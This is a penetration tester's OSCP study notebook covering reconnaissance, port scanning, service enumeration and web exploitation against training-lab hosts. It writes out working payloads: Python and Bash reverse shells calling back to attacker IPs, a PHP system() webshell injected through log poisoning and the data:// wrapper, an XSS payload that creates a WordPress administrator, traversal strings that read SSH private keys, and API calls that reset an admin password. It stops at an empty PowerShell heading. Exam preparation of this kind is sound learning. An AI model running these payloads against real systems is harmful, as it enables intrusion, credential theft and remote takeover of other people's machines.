# OSCP

use tldr before commands

https://mayfly277.github.io/assets/blog/pentest_ad_dark.svg

https://www.emmanuelsolis.com/oscp.html#35111-initial-connection

[https://github.com/Daniel-Ayz/OSCP?tab=readme-ov-file](https://github.com/Daniel-Ayz/OSCP?tab=readme-ov-file) good very good

Recomended way to ssh into labs

[https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b](https://systemweakness.com/6-vs-1-battle-my-oscp-strategy-dd23cc0e912b)

If stuck : ‣ 

`ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52`

https://kashish.gitbook.io/7/red-team

https://kashishtopi.medium.com/how-i-passed-the-oscp-exam-in-6-hours-b15cb29f211c

# INFORMATION GATHERING

## PASSIVE INFORMATION GATHERING

whois -h ip  domain.com

[https://dorksearch.com/](https://dorksearch.com/)

```jsx

Let's search MegaCorp One's repos for interesting information. We can
use **path:users** to search for any files with the word "users" in
the filename and press ENTER.
owner:**megacorpone.com path:users**
```

https://github.com/michenriksen/gitrob

https://github.com/zricethezav/gitleaks

https://securityheaders.com/

https://www.ssllabs.com/ssltest/

## **Active Information Gathering**

https://lolbas-project.github.io/

```jsx

    NS: Nameserver records contain the name of the authoritative servers hosting the DNS records for a domain.
    A: Also known as a host record, the "a record" contains the IPv4 address of a hostname (such as www.megacorpone.com).
    AAAA: Also known as a quad A host record, the "aaaa record" contains the IPv6 address of a hostname (such as www.megacorpone.com).
    MX: Mail Exchange records contain the names of the servers responsible for handling email for the domain. A domain can contain multiple MX records.
    PTR: Pointer Records are used in reverse lookup zones and can find the records associated with an IP address.
    CNAME: Canonical Name Records are used to create aliases for other host records.
    TXT: Text records can contain any arbitrary data and be used for various purposes, such as domain ownership verification.

```

host [www.megacorpone.com](http://www.megacorpone.com/)

host -t mx [megacorpone.com](http://megacorpone.com/)

lowest priority number will be used first to forward mail addressed

```jsx
Next, we can use a Bash one-liner to attempt to resolve each hostname.

kali@kali:~$ for ip in $(cat list.txt); do host $ip.megacorpone.com; done
www.megacorpone.com has address 149.56.244.87
Host ftp.megacorpone.com not found: 3(NXDOMAIN)
mail.megacorpone.com has address 51.222.169.212
Host owa.megacorpone.com not found: 3(NXDOMAIN)
Host proxy.megacorpone.com not found: 3(NXDOMAIN)
router.megacorpone.com has address 51.222.169.214

    Listing 19 - Using Bash to brute force forward DNS name lookups

Using this simplified wordlist, we discovered entries for "www", "mail", and "router". The hostnames "ftp", "owa", and "proxy", however, were not found. Much more comprehensive wordlists are available as part of the SecLists project. These wordlists can be installed to the /usr/share/seclists directory using the sudo apt install seclists command.
```

```jsx
Except for the www record, our DNS-forward brute force enumeration revealed a set of scattered IP addresses in the same approximate range (51.222.169.X). If the DNS administrator of megacorpone.com configured PTR records for the domain, we could scan the approximate range with reverse lookups to request the hostname for each IP.

Let's use a loop to scan IP addresses 51.222.169.200 through 51.222.169.254. We will filter out invalid results (using grep -v), showing only entries that do not contain "not found".

kali@kali:~$ for ip in $(seq 200 254); do host 51.222.169.$ip; done | grep -v "not found"
...
208.169.222.51.in-addr.arpa domain name pointer admin.megacorpone.com.
209.169.222.51.in-addr.arpa domain name pointer beta.megacorpone.com.
210.169.222.51.in-addr.arpa domain name pointer fs1.megacorpone.com.
211.169.222.51.in-addr.arpa domain name pointer intranet.megacorpone.com.
212.169.222.51.in-addr.arpa domain name pointer mail.megacorpone.com.
213.169.222.51.in-addr.arpa domain name pointer mail2.megacorpone.com.
214.169.222.51.in-addr.arpa domain name pointer router.megacorpone.com.
215.169.222.51.in-addr.arpa domain name pointer siem.megacorpone.com.
216.169.222.51.in-addr.arpa domain name pointer snmp.megacorpone.com.
217.169.222.51.in-addr.arpa domain name pointer syslog.megacorpone.com.
218.169.222.51.in-addr.arpa domain name pointer support.megacorpone.com.
219.169.222.51.in-addr.arpa domain name pointer test.megacorpone.com.
220.169.222.51.in-addr.arpa domain name pointer vpn.megacorpone.com.
...

```

[https://github.com/darkoperator/dnsrecon](https://github.com/darkoperator/dnsrecon)

```jsx
dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```

https://www.kali.org/tools/dnsenum/

```jsx
dnsenum megacorpone.com

/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 

```

`xfreerdp /v:192.168.113.152 /u:student /p:lab` 

`xfreerdp /u:damian  /p:'ICannotThinkOfAPassword1!' /v:192.168.177.221 /drive:share,/home/kali/pimpmykali/ +clipboard /size:1920x1080`

Important : xfreerdp /u:stephanie `/d:corp.com` /v:192.168.50.75

`xfreerdp /u:stephanie /d:corp.com /v:192.168.131.75`

PDF INFO : `exiftool -a -u brochure.pdf`

# SCANNING

## CGSM 2001 PORT is used for Google search

while connecting with ftp try both binary and ascii modes

also try ftp -A ip

## TCP/UDP PORT SCANNING

`nc -nvv -w 1 -z 192.168.50.152 3388-3390`

`nc -nv -u -z -w 1 192.168.50.149 120-123`  i.e 120-123 ports  -u for UDPb -w connection timeout -z 0 i/o

Always use -sT if ports are filtered

nmap

https://tools.kali.org/information-gathering/masscan

https://rustscan.github.io/RustScan/

### RustScan

`rustscan -a 192.168.183.227 --range 1-65535     --ulimit 5000`

Use nmap `-sS` for stealth scan

`-sT` for connect scan  `-sU` UDP scan

`sudo apt install prips`

`prips 172.16.195.0/24 > ips.txt` 

`rustscan -a ips.txt --range 1-65535 --ulimit 5000`

SCRIPT

`nmap -p 22,80,2223,8080 192.168.183.201 --script "ssh-*”`
The UDP scan (`-sU`) can also be used in conjunction with a TCP SYN
scan (`-sS`) to build a more complete picture of our target.

Find Alive HOST 

Always use -sT if ports are filtered

`nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt`

`grep Up ping-sweep.txt | cut -d " " -f 2` 

`-A`.
`-iL` Option to read from file 
`nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt`

`-O`

`--osscan-guess` option to force Nmap to print the guessed
result
`--open` to filter out open ports 
`sudo nmap -O 192.168.50.14 --osscan-guess`

`nmap -sT -A 192.168.50.14`

**`Banners can be modified by system administrators and intentionally set to fake service names to mislead potential attackers.`**

`nmap --script http-headers 192.168.50.6` to get http headers

`--script-help` 

### *USING POWERSHELL*

`Test-NetConnection -Port 445 192.168.50.151`

1..1024 | % {try {$t=New-Object Net.Sockets.TcpClient; $t.Connect("192.168.188.151",$*); if($t.Connected){"TCP port $* is open"; $t.Close()}} catch {}}

1..254 | % { $ip="172.16.189.$_"; try { $c=New-Object Net.Sockets.TcpClient; $r=$c.BeginConnect($ip,22,$null,$null); if($r.AsyncWaitHandle.WaitOne(4000,$false)) { $c.EndConnect($r); "$ip open" } $c.Close() } catch {} }

1..254 | % { $ip="172.16.189.$*"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { "$ip is alive" } }
1..254 | % { $ip="172.16.189.$*"; if (Test-Connection -ComputerName $ip -Count 1 -Quiet) { "$ip is alive" } }

USING LINUX SHELL : [for ip in 192.168.208.{6,8,9,11,12,13,14,15,17,20,21,22,23,149,151,152,254}; do (nc -z -w1 $ip 25 && echo "[+] $ip:25 open") || echo "[-] $ip:25 closed"; done

[-] 192.168.208.6:25 closed
[+] 192.168.208.8:25 open
[-] 192.168.208.9:25 closed
[-] 192.168.208.11:25 closed
[-] 192.168.208.12:25 closed
[-] 192.168.208.13:25 closed
[-] 192.168.208.14:25 closed
[-] 192.168.208.15:25 closed
[-] 192.168.208.17:25 closed
[-] 192.168.208.20:25 closed
[-] 192.168.208.21:25 closed
[-] 192.168.208.22:25 closed
[-] 192.168.208.23:25 closed
[-] 192.168.208.149:25 closed
[-] 192.168.208.151:25 closed
[-] 192.168.208.152:25 closed
[-] 192.168.208.254:25 closed
](https://www.notion.so/for-ip-in-192-168-208-6-8-9-11-12-13-14-15-17-20-21-22-23-149-151-152-254-do-nc-z-w1-ip-25--1fccb303896380c4aea4dbf2dc5c9caa?pvs=21) 

`for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`

BEST RESOURCE 

```jsx
https://dev-angelist.gitbook.io/ewptxv3-notes
```

## SMB SCAN

From ewptx

```jsx
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>
nmap -p 445 --script smb-protocols <TARGET_IP>nmap -p 445 --script smb-security-mode <TARGET_IP>
nmap -p 445 --script smb-enum-sessions <TARGET_IP>nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares <TARGET_IP>nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-domains--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-groups--script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-os-discovery <TARGET_IP>
nmap -p445 --script=smb-vuln-* <TARGET_IP>
```

`nmap -v -p 139,445 -oG smb.txt 192.168.50.1-254`

`sudo nbtscan -r 192.168.50.0/24`

`smbclient //192.168.193.248/transfer -U offsec -c "recurse; prompt; ls"`

**`ls -1 /usr/share/nmap/scripts/smb*`**

`nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152`

![image.png](image.png)

`net view \\dc01 /all`

![image.png](image%201.png)

## `*enum4linux*`

```jsx
while read ip; do
  echo "Running enum4linux on $ip"
  enum4linux "$ip"
done < final1.txt

```

MSSQL CLIENT

```cpp
impacket-mssqlclient -port 1433 sql_svc:'Dolphin1'@10.10.73.148 -windows-auth
```

## **SMTP ENUMERATION**

We can also gather information about a host or network from vulnerable
mail servers. The [*Simple Mail Transport
Protocol*](https://www.pcmag.com/encyclopedia/term/smtp) (SMTP)
supports several interesting commands, such as *VRFY* and *EXPN*. A
VRFY request asks the server to verify an email address, while EXPN
asks the server for the membership of a mailing list. These can often
be abused to verify existing users on a mail server, which is useful
information during a penetration test. Consider the following example:

https://mailtrap.io/blog/smtp-commands-and-responses/

### Verify Usernames :

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3:
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

`python3 [smtp.py](http://smtp.py/) root 192.168.50.8`

`Test-NetConnection -Port 25 192.168.50.8`

`dism /online /Enable-Feature /FeatureName:TelnetClient`

![image.png](image%202.png)

```jsx
for ip in 192.168.208.{6,8,9,11,12,13,14,15,17,20,21,22,23,149,151,152,254}; do (nc -z -w1 $ip 25 && echo "[+] $ip:25 open") || echo "[-] $ip:25 closed"; done

[-] 192.168.208.6:25 closed
[+] 192.168.208.8:25 open
[-] 192.168.208.9:25 closed
[-] 192.168.208.11:25 closed
[-] 192.168.208.12:25 closed
[-] 192.168.208.13:25 closed
[-] 192.168.208.14:25 closed
[-] 192.168.208.15:25 closed
[-] 192.168.208.17:25 closed
[-] 192.168.208.20:25 closed
[-] 192.168.208.21:25 closed
[-] 192.168.208.22:25 closed
[-] 192.168.208.23:25 closed
[-] 192.168.208.149:25 closed
[-] 192.168.208.151:25 closed
[-] 192.168.208.152:25 closed
[-] 192.168.208.254:25 closed

```

## **SNMP ENUMERATION**

SNMP is based on UDP, a simple, stateless protocol, and is therefore susceptible to IP spoofing and replay attacks. Additionally, the commonly used SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning that SNMP information and credentials can be easily intercepted over a local network. Traditional SNMP protocols also have weak authentication schemes and are commonly left configured with default public and private community strings.

![image.png](image%203.png)

`sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt`

http://www.phreedom.org/software/onesixtyone/

![image.png](image%204.png)

Using some of the MIB values provided in Table 1, we
can attempt to enumerate their corresponding values. Let's try the
following example against a known machine in the labs, which has a
Windows SNMP port exposed with the community string "public". This
command enumerates the entire MIB tree using the `-c` option to
specify the community string, and `-v` to specify the SNMP version
number, as well as the `-t 10` option to increase the timeout period
to 10 seconds:

`snmpbulkwalk -c public -v2c 10.10.11.136 .`

`/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt`

```jsx
1.3.6.1.2.1.25.1.6.0 	System Processes
1.3.6.1.2.1.25.4.2.1.2 	Running Programs
1.3.6.1.2.1.25.4.2.1.4 	Processes Path
1.3.6.1.2.1.25.2.3.1.4 	Storage Units
1.3.6.1.2.1.25.6.3.1.2 	Software Name
1.3.6.1.4.1.77.1.2.25 	User Accounts
1.3.6.1.2.1.6.13.1.3 	TCP Local Ports
```

`snmpwalk -c public -v1 -t 10 192.168.50.151`

`snmpbulkwalk -c public -v2c  192.168.249.156 .`

![image.png](image%205.png)

![image.png](image%206.png)

`snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25`

`snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2`

# **VULNERABILITY SCANNING**

Using nmap

`/usr/share/nmap/scripts/`

`sudo nmap -sV -p 443 --script "vuln" 192.168.50.124`

One of the first search results is a link to a
[*GitHub*](https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse)
page that provides a script to check for this
vulnerability. Let's download this script and save it as
**`/usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`** to
comply with the naming syntax of the other NSE scripts. Before
we can use the script, we'll need to update **script.db** with
**`--script-updatedb`**.

`sudo nmap --script-updatedb`

`sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124`

# **WEB APPLICATION PENETESTING**

`sudo nmap -p80 --script=http-enum 192.168.50.20` 

https://www.wappalyzer.com/

https://www.kali.org/tools/gobuster/

`/usr/share/wfuzz/wordlist/general/megabeast.txt`

## API PENTESTING

`gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5` 

```jsx
/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
/usr/share/wfuzz/wordlist/general/megabeast.txt
```

```jsx
Some web applications will include their hostname in links and redirects. If we don't have an entry in /etc/hosts that matches the web application's hostname, our browser and other tools may not be able to follow these links.

This allows us to access the VM by hostname while bypassing DNS.

kali@kali:~$ cat /etc/hosts 
...
192.168.50.16 offsecwp

```

Historically, headers that started with "X-" were called non-standard
HTTP headers. However, [*RFC6648*](https://www.rfc-editor.org/rfc/rfc6648) now deprecates the use of
"X-" in favor of a clearer naming convention.
*Representational State Transfer* (REST)

```jsx
We can use Gobuster features to brute force the API endpoints. In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack.

API paths are often followed by a version number, resulting in a pattern such as:

/api_name/v1

```

Pattren 

```jsx
{GOBUSTER}/v1
{GOBUSTER}/v2
```

`gobuster dir -u [http://192.168.50.16:5002](http://192.168.50.16:5002/) -w /usr/share/wordlists/dirb/big.txt -p pattern` 

`curl -i [http://192.168.50.16:5002/users/v1](http://192.168.50.16:5002/users/v1)` 

`gobuster dir -u [http://192.168.50.16:5002/users/v1/admin/](http://192.168.50.16:5002/users/v1/admin/) -w /usr/share/wordlists/dirb/small.txt` 

`/usr/share/wfuzz/wordlist/general/megabeast.txt`

`curl -i [http://192.168.50.16:5002/users/v1/admin/password](http://192.168.50.16:5002/users/v1/admin/password)` 

`curl -i [http://192.168.50.16:5002/users/v1/login](http://192.168.50.16:5002/users/v1/login)` 

```jsx
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

```jsx
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

```jsx
curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

```jsx
curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'
```

```jsx
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```

## CROSS SITE SCRIPTING

**`<script>alert(42)</script>`**

```jsx
The HttpOnly flag instructs the browser to deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload to steal the cookie.
```

```jsx
Since all the session cookies can be sent only via HTTP, unfortunately, they also cannot be retrieved via JavaScript through our attack vector. We'll need to find a new angle.
```

```jsx
For instance, we could craft a JavaScript function that adds another WordPress administrative account, so that once the real administrator executes our injected code, the function will execute behind the scenes.
```

```jsx
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/

### To minify our attack code into a one-liner using https://jscompress.com/

To encode afterwards use this script :

```jsx
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

we can run it from browser console

```jsx
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,59))</script>" --proxy 127.0.0.1:8080
```

Before running the curl attack command, let's start Burp and leave Intercept on.

### Getting Plugin RCE

[https://github.com/p0dalirius/Wordpress-webshell-plugin](https://github.com/p0dalirius/Wordpress-webshell-plugin)

Then used revshell to get interactive shell

```jsx
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.168",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

# **Directory Traversal**

IMPORTANT

```jsx
In this example, we'll attempt to retrieve an SSH private key with the name id_rsa. The name will differ depending on the specified type when creating an SSH private key with ssh-keygen. For example, when choosing ecdsa as the type, the resulting SSH private key is named id_ecdsa by default.

id_rsa

id_dsa

id_ecdsa

id_ed25519

id_ed448
```

Absolute paths start with a forward slash (**/**)
`Windows uses backslashes instead of forward slashes for file paths`
`/home/offsec/.ssh/id_rsa` 

CRACK: search **SSH Private Key Passphrase**

`cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65//home/alfred/.ssh/id_rsa`

```jsx
sWhen performing web application testing, we should mainly use tools such as Burp, cURL, or a programming language of our choice.

```

`http://mountaindesserts.com/meteor/index.phppage=../../../../../../../../../home/offsec/.ssh/id_rsa`

`chmod 400 dt_key`

`ssh -i dt_key -p 2222 [offsec@mountaindesserts.com](mailto:offsec@mountaindesserts.com)` 

```jsx
On Linux, we usually use the /etc/passwd file to test directory traversal vulnerabilities. On Windows, we can use the file C:\Windows\System32\drivers\etc\hosts to test directory traversal vulnerabilities,
```

For linux use ssh key or /etc/passwd

For windows 

```jsx
Once we gather information about the running application or service, we can research paths leading to sensitive files. For example, if we learn that a target system is running the Internet Information Services (IIS) web server, we can research its log paths and web root structure. Reviewing the Microsoft documentation, we learn that the logs are located at C:\inetpub\logs\LogFiles\W3SVC1\. Another file we should always check when the target is running an IIS web server is C:\inetpub\wwwroot\web.config, which may contain sensitive information like passwords or usernames.
```

`Windows uses backslashes instead of forward slashes for file paths`

```jsx
 Therefore, we should always try to leverage both forward slashes and backslashes when examining a potential directory traversal vulnerability in a web application running on Windows.
```

```jsx
Grfana redirects to login pag when access /public/plugins/alertlist/ but give output when combined with directory traversal attack ../../../../../conf/defaults.ini
```

Remove drive letter 

/public/plugins/alertlist/../../../../../../../../../../../../../../../Users\install.txt 

```jsx
./ is a known way to abuse web application behavior, this sequence is often filtered by either the web server, web application firewalls, or the web application itself.

Fortunately for us, we can use URL Encoding, also called Percent Encoding, to potentially bypass these filters. We can leverage specific ASCII encoding lists to manually encode our query from listing 11 or use the online converter on the same page. For now, we will only encode the dots, which are represented as "%2e".
```

 https://www.w3schools.com/tags/ref_urlencode.asp

### Dot Obfuscation :

`curl [http://192.168.50.16/cgi-bin/../../../../etc/passwd](http://192.168.50.16/etc/passwd)`

`/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/opt/passwords` 

If curl `--path-as-is` above

Encoded grafana : 

`/public/plugins/alertlist/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/passwd`

# **File Inclusion Vulnerabilities**

*File inclusion* vulnerabilities allow us to "include" a file in the application's running code.

For example, if we leverage a directory traversal vulnerability in a PHP web application and specify the file **admin.php**, the source code of the PHP file will be displayed. On the other hand, when dealing with a file inclusion vulnerability, the **admin.php** file will be executed instead.

In the following example, our goal is to obtain *Remote Code Execution* (RCE) via an LFI vulnerability. We will do this with the help of [*Log Poisoning*](https://owasp.org/www-community/attacks/Log_Injection).

https://github.com/nickpupp0/LogPoisoner/blob/main/logpoisoner.py 

### LogPoisoner

```jsx

curl [http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log](http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log)
page=../../../../../../../../../../../../Windows\System32\drivers\etc\hosts
**/var/www/html/backup.php

/proc/self/environ Poisoning

Apache/PHP stores request headers in /proc/self/environ. You can poison it just like logs.
https://freedium.cfd/https://santhosh-adiga-u.medium.com/from-lfi-to-rce-real-exploitation-in-practice-06c29f78b04f

PHP REVSHELL : https://www.revshells.com/PHP%20PentestMonkey?ip=127.0.0.1&port=1234&shell=%2Fbin%2Fsh&encoding=%2Fbin%2Fsh**

```

### Check table

| Check | Behavior | Vulnerability |
| --- | --- | --- |
| Plain-text output of a system file (e.g., `/etc/passwd`) | File is displayed as-is | Likely **Directory Traversal** |
| Server throws PHP/ASP error with file path info | File was attempted to be included | Likely **LFI** |
| PHP code is **executed** (e.g., payload injected into logs and runs) | File was included and executed | **LFI** |
| Works with static (non-PHP) files only | Only reads content, no execution | **Directory Traversal** |
| Look for parameters like: | `?file=`, `?path=`, `?page=`, `?doc=`, `?template=`, etc. |  |
| But we can use PHP wrappers See Below |  |  |

```jsx
User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
```

`../../../../../../../../../var/log/apache2/access.log&cmd=`

If space in command use `%20` for space

```jsx
The output in the Response section shows that our input triggers an error. This happens due to the space between the command and the parameters. There are different techniques we can use to bypass this limitation, such as using Input Field Separators (IFS) or URL encoding
```

gcc -static -O2 -o exploit exploit.c

GLIBC ERROR

# **Bash revshell** :

Bash oneliner

```jsx
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
 To get tty shell
 python3 -c 'import pty; pty.spawn("/bin/sh")'
```

```jsx
Since we'll execute our command through the PHP *system* function,
we should be aware that the command may be executed via the [*Bourne
Shell*](https://en.wikipedia.org/wiki/Bourne_shell), also known
as *sh*, rather than Bash. The reverse shell one-liner in Listing
17 contains syntax that is not supported by
the Bourne Shell. To ensure the reverse shell is executed via Bash, we
need to modify the reverse shell command. We can do this by providing
the reverse shell one-liner as argument to **bash -c**, which executes
a command with Bash.
```

```
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

```jsx
payload = '<?php system("bash -c \'bash -i >& /dev/tcp/192.168.45.225/9001 0>&1\'"); ?>'
```

URL encoded : 

`bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`

```jsx
When we use Log Poisoning on Windows, we should understand that the log files are in application-specific paths. For example, on a target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
```

```jsx
Outside PHP, we can also leverage LFI and RFI vulnerabilities in other frameworks or server-side scripting languages including:

    Perl
    Active Server Pages Extended
    Active Server Pages
    Java Server Pages
    JSP
We can also find LFI vulnerabilities in modern back-end JavaScript runtime environments like Node.js.
```

### ALWAYS EXECUTE OR READ BACKUP PHP OR OTHER FILES

`./../../../../../../../../xampp\apache\logs\access.log&cmd=`

## **PHP Wrappers**

```jsx
We also notice that the <body> tag is not closed at the end of the HTML code. We can assume that something is missing. PHP code will be executed server side and, as such, is not shown. When we compare this output with previous inclusions or review the source code in the browser, we can conclude that the rest of the index.php page's content is missing.

Next, let's include the file, using php://filter to better understand this situation. We will not use any encoding on our first attempt. The PHP wrapper uses resource as the required parameter to specify the file stream for filtering, which is the filename in our case. We can also specify absolute or relative paths in this parameter.
```

`curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php`

```jsx
The output of Listing 22 shows the same result as Listing 21. This makes sense since the PHP code is included and executed via the LFI vulnerability. Let's now encode the output with base64 by adding convert.base64-encode. This converts the specified resource to a base64 string.
```

`curl http/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`

```jsx
echo "PCFET0NU" | base64 -d
```

### **`data://** wrapper to achieve code execution`

`This offers an alternative method when we cannot poison a local file with PHP code.`

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php echo system('ls');?>"`

```jsx
When web application firewalls or other security mechanisms are in place, they may filter strings like "system" or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We'll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.
```

Convert to base64 : `echo -n '<?php echo system($_GET["cmd"]);?>' | base64` 

`curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls`

```jsx
However, we need to be aware that the data:// wrapper will not work in a default PHP installation. To exploit it, the allow_url_include setting needs to be enabled.
```

**`/var/www/html/backup.php`**

```jsx
page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname+-a HTTP/1.1
```

## **Remote File Inclusion (RFI)**

```jsx
allow_url_include option needs to be enabled to leverage RFI
```

```jsx
While LFI vulnerabilities can be used to include local files, RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB
```

```jsx
Common scenarios where we'll find this option enabled is when the web application loads files or contents from remote systems e.g. libraries or application data
```

`python3 -m http.server 80`  to host php webshell

`curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls`

LS -LA

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

# **File Upload Vulnerabilities**

## AFTER UPLOAD FILE TRY TO FUZZ IT AROUND ALL WEB PORTS

```jsx
When testing a file upload form, we should always determine what happens when a file is uploaded twice. If the web application indicates that the file already exists, we can use this method to brute force the contents of a web server. Alternatively, if the web application displays an error message, this may provide valuable information such as the programming language or web technologies in use.
```

```jsx
For example, when we are allowed
to upload an avatar to a profile with an
[*SVG*](https://developer.mozilla.org/en-US/docs/Web/SVG) file type,
we may embed an XXE attack to display file contents or even execute
code.

```

```jsx
The third category relies on user interaction. For example, when we discover an upload form for job applications, we can try to upload a CV in .docx format with malicious macros integrated. Since this category requires a person to access our uploaded file, we will focus on the other two kinds of file upload vulnerabilities in this Learning Unit.
```

```jsx
The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack
```

![image.png](image%207.png)

Extract NTLM 

Check Responder Section

https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt

```jsx
Another way we can bypass the filter is by changing characters in the file extension to upper case. 
```

# POWERSHELL ONELINER

```jsx

